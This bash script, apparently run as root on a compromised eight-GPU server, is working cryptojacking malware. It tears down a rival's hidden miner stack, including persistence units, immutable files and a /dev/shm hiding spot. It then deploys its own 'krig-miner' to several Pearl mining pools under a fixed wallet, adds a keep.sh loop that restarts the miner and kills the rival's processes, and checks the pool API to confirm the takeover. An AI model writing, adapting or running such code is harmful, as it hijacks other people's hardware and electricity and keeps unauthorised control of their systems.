#!/bin/bash
# i4981 run11: remove competitor stack (plh-keeper/plh-card/plhllm/cron), relaunch ours, verify survival
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
log "-- plh-keeper unit"; systemctl cat plh-keeper.service 2>/dev/null | head -25
echo "-- /opt/plh/keep.sh"; cat /opt/plh/keep.sh 2>/dev/null | head -40
echo "-- /opt/plh/keepalive.sh"; head -40 /opt/plh/keepalive.sh 2>/dev/null
echo "-- crontab"; crontab -l 2>/dev/null | head -20

log "### TEAR-DOWN-COMPETITOR"
chattr -i -R /opt/plh /opt/plhllm 2>/dev/null
systemctl stop plh-keeper.service plh-card@0..7 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl stop plh-card@$i 2>/dev/null; systemctl disable plh-card@$i 2>/dev/null; done
systemctl disable plh-keeper.service 2>/dev/null
for u in /etc/systemd/system/plh-keeper.service /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-c2fetch.service /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-guard.timer; do chattr -i "$u" 2>/dev/null; rm -f "$u"; done
for p in $(pgrep -f '/opt/plh|plh-keeper|plhllm' 2>/dev/null); do kill -9 $p 2>/dev/null; done
sleep 1
rm -rf /opt/plh /opt/plhllm /usr/local/lib/nv-cache /dev/shm/.u
rm -f /etc/cron.d/plh-keepalive /etc/cron.d/plh-keep.sh
crontab -l 2>/dev/null | grep -vE '/opt/plh|plh-keep|plh-keeper' | crontab -
systemctl daemon-reload
sleep 3
echo "teardown: plh_procs=$(pgrep -fc '/opt/plh|plh-keeper|plhllm') unit=$(systemctl list-unit-files 2>/dev/null | grep -c plh)"

log "### RELAUNCH-OURS"
mkdir -p /root/ul_plant
cp -f /opt/ul2/krig-miner /root/ul_plant/krig-miner 2>/dev/null; chmod 755 /root/ul_plant/krig-miner
ls -la /root/ul_plant/krig-miner
cat > /root/ul_plant/keep.sh <<EOS
#!/bin/bash
for p in \$(pgrep -f '/opt/plh|plh-keeper' 2>/dev/null); do kill -9 \$p 2>/dev/null; done
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul2-card@\$i || systemctl start ul2-card@\$i 2>/dev/null; done
if ! pgrep -f 'ul2/krig-miner' >/dev/null; then
  for i in 0 1 2 3 4 5 6 7; do
    CUDA_VISIBLE_DEVICES=\$i setsid nohup /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g\$i --password x -d 0 --api-port 14\$i >>/root/ul_plant/f\$i.log 2>&1 &
  done
fi
EOS
chmod 755 /root/ul_plant/keep.sh
pkill -9 -f 'ul2-card'; sleep 1
for i in 0 1 2 3 4 5 6 7; do systemctl start ul2-card@$i 2>/dev/null; done
sleep 6
systemctl list-units --state=active --plain --no-legend 'ul2-card@*' | wc -l
bash /root/ul_plant/keep.sh
sleep 20
echo "launch: ourprocs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc '/opt/plh')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader

log "### OBSERVE"
sleep 160
echo "OBSERVE: ourprocs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc '/opt/plh|plh-keeper') units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l)"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
timeout 25 curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run11.json; echo size=$(stat -c%s $D/pool_run11.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run11.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### DONE $(date -u +%FT%TZ)"
